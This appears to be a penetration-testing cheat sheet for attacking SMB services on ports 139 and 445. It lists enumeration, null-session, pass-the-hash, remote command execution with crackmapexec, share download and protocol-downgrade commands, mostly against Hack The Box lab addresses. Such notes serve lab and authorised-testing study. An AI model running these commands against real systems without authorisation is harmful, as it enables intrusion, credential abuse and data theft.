---
description: >-
  The Microsoft Server Message Block protocol was often used with NetBIOS over
  TCP/IP (NBT) over UDP, using port numbers 137 and 138, and TCP port numbers
  137 and 139.
---

# 139/445 - SMB

## Find version

Find SMB version using metasploit:

`Msfconsole;use scanner/smb/smb_version`

Using nmap scripts:

`nmap --script=smb-enum* --script-args=unsafe=1 -T5` 

## **Discover shares**

**smbmap:**

`smbmap -H [ip]`

or

 ****`smbmap -H [ip] -d [domain] -u [user] -p [password]`

**smbclient:**

`smbclient //IP/Share`

Or

`smbclient -L //$TARGET`

**Nmap:**

`nmap --script smb-enum-shares -p139,445 -T4 -Pn` 

## Connect to share

**smbmap**:

`$ python smbmap.py -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\Users'`

**smbclient:**

`smbclient //$ip/share -U username`

or

`smbclient \\\\{IP}\\Share`

## Connect to the host

**Crackmapexec:**

`crackmapexec smb -d . -u Administrator -p 'pass123' -x "whoami" 192.168.204.183`

Using smbexec:

`crackmapexec smb --exec-method smbexec -d . -u Administrator -p 'pass123' -x "whoami" 192.168.204.183`

## Pass The Hash

`smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' -d hackthebox.htb -H 10.10.10.107` 

Or 

`smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' -d hackthebox.htb -H 10.10.10.107 -R` 

**Crackmapexec**:

`crackmapexec smb  -u username -H LMHASH:NTHASH`

## Null Session

smbmap:

`smbmap -H {IP}` 

rpcclient:

`rpcclient -U "" -N {IP}`

crackmapexec:

`crackmapexec smb <target(s)> -u '' -p ''`

## Download files

**using smbmap:**

`smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' -d hackthebox.htb -H 10.10.10.107 --download alice/my_private_key.ppk`

#### using smbget

`smbget -R smb://10.10.10.178/Secure$`

#### using smbclient

```text
root@kali# smbclient -U TempUser //10.10.10.178/Secure$ welcome2019
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun  5 07:05:22 2020
  ..                                  D        0  Fri Jun  5 07:05:22 2020
  Finance                             D        0  Wed Aug  7 15:40:13 2019
  HR                                  D        0  Wed Aug  7 19:08:11 2019
  IT                                  D        0  Thu Aug  8 06:59:25 2019

                10485247 blocks of size 4096. 6545925 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \HR\*
NT_STATUS_ACCESS_DENIED listing \IT\*

```

## Check for vulnerabilities

Using nmap:

`nmap --script smb-vuln* -p139,445 -T4 -Pn` 

## User Enumeration

Metasploit:

`use auxiliary/scanner/smb/smb_enumusers`

## Tools

### smbclient

`smbclient -L //$TARGET`

### smbmap 

If we have username and password: 

`smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97` 

Username and password for speciifc folder 

`smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' -H \\\\10.10.10.97\\new-site` 

#### PassTheHash 

`smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' -d hackthebox.htb -H 10.10.10.107`

**Download a file** 

`smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' -d hackthebox.htb -H 10.10.10.107 --download alice/my_private_key.ppk` 

### Enum4Linux 

Does everything in 1 script:

`enum4linux –a 10.0.0.1` 

### Nmap

SMB enumeration using all scripts:

`nmap --script=smb-enum* --script-args=unsafe=1 -T5` 

### Metasploit

Find SMB version:

`Msfconsole;use scanner/smb/smb_version`

Enum users:

`use auxiliary/scanner/smb/smb_enumusers`

### Impacket **samrdump.py**

Samrdump is an application that retrieves sensitive information about the specified target machine using the Security Account Manager \(SAM\). It is a remote interface that is accessible under the Distributed Computing Environment / Remote Procedure Calls \(DCE/RPC\) service. It lists out all the system shares, user accounts, and other useful information about the target’s presence in the local network. The image clearly shows us all the user accounts that are held by the remote machine. Inspecting all the available shares for sensitive data and accessing other user accounts can further reveal valuable information.

**Syntax:**

samrdump.py \[domain\]/\[user\]:\[Password/Password Hash\]@\[Target IP Address\]

**Command:**

samrdump.py ignite/Administrator:Ignite@987@192.168.1.105

## Protocol Mismatch

When the following error is observed:

```text
root@kali# smbclient -N //10.10.10.3/tmp 
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

 The client is set up for security reasons not to connect to older SMB versions. 

By adding support to NT1 we can connect:

```text
root@kali# smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1' 
Anonymous login successful 
Try "help" to get a list of possible comman
```

You will need to add a line to the following file: my /etc/samba.smb.conf:

```text
[global] 
client min protocol=NT1 
```

##  Resources:

[https://docs.google.com/spreadsheets/d/1F9wUdEJv22HdqhSn6hy-QVtS7eumgZWYYrD-OSi6JOc/edit\#gid=2080645025](https://docs.google.com/spreadsheets/d/1F9wUdEJv22HdqhSn6hy-QVtS7eumgZWYYrD-OSi6JOc/edit#gid=2080645025)

